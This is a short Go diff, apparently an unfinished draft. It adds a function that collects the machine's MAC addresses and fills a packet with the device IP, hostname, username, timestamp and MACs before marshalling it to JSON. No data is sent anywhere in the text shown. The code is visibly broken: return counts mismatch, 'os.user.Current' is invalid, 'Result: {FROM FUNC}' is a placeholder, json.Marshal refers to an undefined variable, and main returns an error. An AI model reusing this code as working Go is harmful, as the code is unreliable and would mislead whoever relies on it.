@@ -4,6 +4,7 @@ import(
 	"fmt"
     "encoding/json"
 	"os"
+	"time"
 )
 
 type Packet struct {
@@ -62,13 +63,38 @@ func getIP() string{
 	return string(ip)
 }
 
+func getMacAddr() ([]string, error) {
+    ifas, err := net.Interfaces()
+    if err != nil {
+        return nil, err
+    }
+    var as []string
+    for _, ifa := range ifas {
+        a := ifa.HardwareAddr.String()
+        if a != "" {
+            as = append(as, a)
+        }
+    }
+    return as
+}
+
 func main(){
 
 	sendData := Packet{
 		Type: true,
 		DevIP: getIP(),
-		Hostname: os.Hostname(),
-		Username: os.user.Current()
-
+		Hostname: os.Hostname(), //TURN TO FUNC (?)
+		Username: os.user.Current(), //TURN TO FUNC(?)
+		Time: time.Now().UTC().Format("2006-01-02 15:04:05"),
+		Result: {FROM FUNC},
+		Mac: getMacAddr(),
 	}
+
+	dat, err := json.Marshal(c)
+if err != nil {
+    return err
+}
+
+
+
 }
